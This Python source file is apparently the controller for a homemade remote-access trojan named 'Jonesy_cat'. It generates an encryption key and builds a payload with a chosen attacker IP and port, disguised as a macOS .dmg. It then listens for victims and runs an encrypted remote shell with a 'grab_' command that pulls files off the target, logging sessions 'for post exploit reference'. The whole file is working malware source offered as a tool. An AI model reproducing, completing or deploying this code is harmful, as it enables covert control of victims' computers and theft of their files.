import datetime
import os
import pickle
import socket
import struct
import sys

from colored import fg, attr
from cryptography.fernet import Fernet

#### text colours - hex
'red'
CRED = fg('#D8002B') #not red enough!
'blue'
CBLU = fg('#0A31CE') #purple...
'purple'
CYEL = fg('#7B6ED6')
'green'
CGREEN = fg('#31CE0A')
'yellow'
CPUR = fg('#7B6ED6')
res = attr('reset')

'#### - SYMMETRIC ENCRYPTION - ####'
# Generate Key:
# - Each time a connection is compromised you should generate a new key for exploits
def generate_key():
    key = Fernet.generate_key()
    with open("Jonesy_cat.key", "wb") as key_file:
         key_file.write(key)
    print("New key is saved in 'Jonesy_cat.key' file.")
    print("'" + key.decode() + "'")
    menu()

'# Read Key:'
# - read key from file
def read_key():
    return open("Jonesy_cat.key", "rb").read()


'# Encrypt message:'
# - read key and encrypt
def encrypt_mess(comm):
    'encode message'
    key = read_key()
    encoded_message = comm.encode()
    'use key to encrypt'
    f = Fernet(key)
    encrypted = f.encrypt(encoded_message)
    return encrypted

'# Decrypt data'
def decrypt_mess(message):
    key = read_key()
    f = Fernet(key)
    decrypted_mess = f.decrypt(message)
    return decrypted_mess

'#read executable code file'
def read_code():
    return open("exec_example.py", "rb").read()

'#### - GENERAL FUNCTIONS - ####'
def banner():
    print("")
    print("")
    print(CGREEN + "     ____._______                                 _________         __   ")
    print("    |    |\\   _  \\   ____   ______ ____ ___.__.   \\_   ___ \\_____ _/  |_ ")
    print("    |    |/  /_\\  \\ /    \\ /  ___// __ <   |  |   /    \\  \\/\\__  \\\\   __\\ ")
    print("/\\__|    |\\  \\_/   \\   |  \\___ \\ \\  ___/\\___  |   \\     \\____/ __ \\|  |  ")
    print("\\________| \\_____  /___|  /____  >\\___  > ____|____\\______  (____  /__|  ")
    print("                 \\/     \\/     \\/     \\/\\/   /_____/      \\/     \\/      ")
    print(CRED + "######################## " + CBLU + "created by Ford Larman" + CRED+ " ########################")
    menu()

'# Menu'
def menu():
    print("\n")
    print(CGREEN + "---Menu---")
    print(CRED + "1." + CBLU + " Generate Encryption Key")
    print(CRED + "2." + CBLU + " Create .dmg")
    print(CRED + "3." + CBLU + " Connect to Target")
    print(CRED + "type 'exit' to exit")
    select = input(CGREEN + ">>>: " + res)
    if select == "3":
        find_Server()
    elif select == "2":
        create_rat()
    elif select == "1":
        generate_key()
    elif select == "exit":
        print(CRED + "[!] Shutting Down")
        sys.exit()
    else:
        print(CRED + "[!] Bad Input")


'# Connect to Server'
def find_Server():
    'initialise socket'
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("\n")
    print(CGREEN + ">>> Connecting to Target")

    '#### Enter you local IP and port ####'
    ip = input("Enter IP: " + res)
    port = input(CGREEN + "Enter Port number: " + res)
    ss.bind((ip, int(port)))
    print(CRED + "[+]" + CBLU + " Server On")
    ss.listen(5)
    print(CRED + "[+]" + CBLU + " LISTENING...")
    (clientsocket, address) = ss.accept()
    print(CPUR + "[+]" + CBLU + "Target CONNECTED!")
    print(CPUR + "[+]" + CBLU + " @ " + str(address))
    backdoor(clientsocket, ss)

###NEEDS WORK TO BE SOMETHING LEGITIMATE###
# Make executable file a MacOS specific file. Not python file.
'# Create rat file'
def create_rat():
    print(CPUR + "\n[+] Creating RAT Executable")
    print(CGREEN + "Please Enter Your designated machine details." + res )
    ip = input(CGREEN + ">>> IP address: " + res)
    port = input(CGREEN + ">>> Destination port : "+ res)
    name = input(CGREEN + "enter file name: "+ res)
    full_name = name + ".py"
    current_key = read_key()
    code = read_code()
    with open(full_name, "wb") as f:
        f.write(code)
    # read the new file lines
    with open(full_name, "r") as f:
       get_all = f.readlines()
    # write inputs to new file.
    with open(full_name, "w") as f:
        for i, line in enumerate(get_all, 1):
            if i == 14:
                f.writelines("    key = " + str(current_key) + "\n")
            elif i == 58:
                f.writelines("        ip =" + "'" + ip + "'" + "\n")
            elif i == 59:
                f.writelines("        port = " + port + "\n")
            else:
                f.writelines(line)
    print(CPUR + "[+] Writing Executable...")
    # disguise socket as executable
    make_dmg_file(name)
    print(CPUR + "[+] Executable " + name + " created")
    menu()

'convert python file to executable'
def make_dmg_file(name):
    'take generated python file and call dmgbuild'
    os.system("sh build_script.sh")
    #os.system("rm "+ name + ".py")
    return

'screen shot function'
# handle image as packets
def download_file(conn):
    data_size = struct.unpack('>I', conn.recv(4))[0]
    received_payload = b""
    remaining_payload_size = int(data_size)
    while remaining_payload_size > 0:
        received_payload += conn.recv(remaining_payload_size)
        remaining_payload_size = data_size - len(received_payload)
    data = pickle.loads(received_payload)
    return data

'#### - BACKDOOR FUNCTIONS - ####'
# Communicate via backdoor
#### Needs a file write function to maintain log activity for post exploit reference
def backdoor(client, ss):
    print("\n")
    date = datetime.datetime.now()
    logName = str(date) + ".txt"
    with open('logs/' + logName, "w") as f:
        f.writelines("JC--LOG FILE: " + str(date) + "\n")
        f.close()
    while True:
        shell = input(CRED + "Shell>>>" + res)
        if shell == "exit":
            print(CPUR + "[+]"+ CBLU + "Closing connection!\n")
            client.close()
            ss.close()
            with open('logs/' + logName, "a") as f:
                f.writelines("***Transmission Ended***")
                f.close()
            menu()
        elif shell == "help":
            print("\n#################################################")
            print("You've entered the targets computer..")
            print("You have a few options: ")
            print("'exit'  - to close connection")
            print("'grab_<filename>' - allows you to download a specific file")
            print("\nOtherwise all directory commands remain the same.")
            print("Goodluck!")
            print("- JC\n")
            print("###################################################\n")
        elif "grab_" in shell:
              message = encrypt_mess(shell)
              client.sendall(message)
              file_name = shell.replace("grab_", "")
              data = download_file(client)
              # save bytes to file format
              f = open(file_name, "wb")
              f.write(data)
              f.close()
              print("\n You grabbed " + file_name + "!\n")
        else:
            message = encrypt_mess(shell)
            #print(message)
            #needs error checking here
            client.sendall(message)
            #receive data
            data = client.recv(4096)
            #decrypt data
            rcv_message = decrypt_mess(data)
            #print message decoded
            print(rcv_message.decode())
            #Log file
            with open('logs/' +logName, "a") as f:
                f.writelines("Shell>>>" + shell + "\n")
                f.writelines(rcv_message.decode())
                f.writelines("\n")
                f.close()


banner()